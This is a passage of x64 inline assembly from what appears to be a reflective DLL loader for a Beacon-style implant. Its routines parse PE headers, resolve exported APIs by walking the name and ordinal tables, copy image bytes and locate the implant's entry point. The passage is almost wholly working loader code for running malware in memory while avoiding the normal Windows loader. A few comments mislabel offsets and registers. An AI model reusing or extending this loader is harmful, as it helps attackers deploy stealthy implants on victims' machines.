    "mov eax, [rbx+rcx] \n"
    "add rax, r8 \n"
    "ret \n" // return ExportDirectory;
"getExportAddressTable: \n"
    "xor rax, rax \n"
    "add rdx, 0x1C \n"         // DWORD AddressOfFunctions; // 0x1C offset // RDX = &RVAExportAddressTable
    "mov eax, [rdx] \n"        // RAX = RVAExportAddressTable (Value/RVA)
    "add rax, rcx \n"          // RAX = VA ExportAddressTable (The address of the Export table in running memory of the process)
    "ret \n" // return ExportAddressTable
"getExportNameTable: \n"
    "xor rax, rax \n"
    "add rdx, 0x20 \n"         // DWORD AddressOfFunctions; // 0x20 offset 
    "mov eax, [rdx] \n"        // RAX = RVAExportAddressOfNames (Value/RVA)
    "add rax, rcx \n"          // RAX = VA ExportAddressOfNames 
    "ret \n" // return ExportNameTable;
"getExportOrdinalTable: \n"
    "xor rax, rax \n"
    "add rdx, 0x24 \n"         // DWORD AddressOfNameOrdinals; // 0x24 offset 
    "mov eax, [rdx] \n"        // RAX = RVAExportAddressOfNameOrdinals (Value/RVA)
    "add rax, rcx \n"          // RAX = VA ExportAddressOfNameOrdinals 
    "ret \n" // return ExportOrdinalTable;
"getSymbolAddress: \n"
    "mov r10, [RSP+0x28] \n" // ExportNameTable
    "mov r11, [RSP+0x30] \n" // ExportOrdinalTable
    "xchg rcx, rdx \n"       // RCX = symbolStringSize & RDX =symbolString
    "push rcx \n"            // push str len to stack
    "xor rax, rax \n"
"loopFindSymbol: \n"
    "mov rcx, [rsp] \n"             // RCX/[RSP] = DWORD symbolStringSize (Reset string length counter for each loop)
    "xor rdi, rdi \n"               // Clear RDI for setting up string name retrieval
    "mov edi, [r10+rax*4] \n"       // EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
    "add rdi, r8 \n"                // RDI = &NameString    = RVA NameString + &module.dll
    "mov rsi, rdx \n"               // RSI = Address of API Name String to match on the Stack (reset to start of string)
    "repe cmpsb \n"                 // Compare strings at RDI & RSI
    "je FoundSymbol \n"             // If match then we found the API string. Now we need to find the Address of the API
    "inc rax \n"                    // Increment to check if the next name matches
    "jmp short loopFindSymbol \n"   // Jump back to start of loop
"FoundSymbol: \n"
    "pop rcx \n"                    // Remove string length counter from top of stack
    "mov ax, [r11+rax*2] \n"        // RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
    "mov eax, [r9+rax*4] \n"        // RAX = RVA API = [&AddressTable + API OrdinalNumber]
    "add rax, r8 \n"                // RAX = module.<API> = RVA module.<API> + module.dll BaseAddress
    "sub r11, rax \n"               // See if our symbol address is greater than the OrdinalTable Address. If so its a forwarder to a different API
    "jns isNotForwarder \n"         // If forwarder, result will be negative and Sign Flag is set (SF), jump not sign = jns
    "xor rax, rax \n"               // If forwarder, return 0x0 and exit
"isNotForwarder: \n"
    "ret \n"
"getNewExeHeader: \n"
    "xor rax, rax \n"
    "mov eax, [rcx+0x3C] \n"           // RBX = Offset NewEXEHeader
    "add rax, rcx \n"                  // RBX = &module.dll + Offset NewEXEHeader = &NewEXEHeader
    "ret \n" // return NewExeHeader;
"getDllSize: \n"
    "xor rbx, rbx \n"
    "mov ebx, [rcx+0x50] \n" // EBX = ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfImage
    "mov rax, rbx \n"
    "ret \n" // return dllSize;
    "getDllSizeOfHeaders: \n"
    "xor rbx, rbx \n"
    "mov ebx, [rax+0x54] \n" // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfHeaders
    "mov rax, rbx \n"
    "ret \n" // return SizeOfHeaders;
"copyMemory: \n"
    "dec ecx \n"           // Decrement the counter
    "xor rbx, rbx \n"
    "mov bl, [rdx]  \n"    // Load the next byte to write into the BL register
    "mov [r8], bl \n"      // write the byte
    "inc rdx \n"           // move rdx to next byte of source 
    "inc r8 \n"            // move r8 to next byte of destination 
    "test rcx, rcx \n"     // check if rax = 0
    "jne copyMemory \n"    // if rax != 0, then write next byte via loop
    "ret \n"
"getOptionalHeader: \n"
    "add rcx, 0x18 \n"
    "xchg rax, rcx \n"
    "ret \n" // return OptionalHeader
"getSizeOfOptionalHeader: \n"
    "add rcx, 0x14 \n"  // RAX = &FileHeader.SizeOfOptionalHeader
    "xor rbx, rbx \n"
    "mov bx, [rcx] \n"  // RBX = Value of FileHeader.SizeOfOptionalHeader
    "xchg rax, rbx \n"
    "ret \n" 
"add: \n"
    "add rcx, rdx \n"
    "xchg rax, rcx \n"
    "ret \n" 
"getNumberOfSections: \n"
    "add rcx, 0x6 \n"  // RAX = &FileHeader.NumberOfSections
    "xor rax, rax \n"
    "mov ax, [rcx] \n"
    "ret \n" 
"getImportDirectory: \n"
    "add rcx, 0x78 \n"
    "xchg rax, rcx \n"
    "ret \n" //return ImportDirectory 
"getBeaconEntryPoint: \n"
    "add rdx, 0x10 \n"       // OptionalHeader.AddressOfEntryPoint
    "mov eax, [rdx] \n"
    "add rax, rcx \n"       // newRdllAddr.EntryPoint
    "ret \n" // return newRdllAddrEntryPoint
);
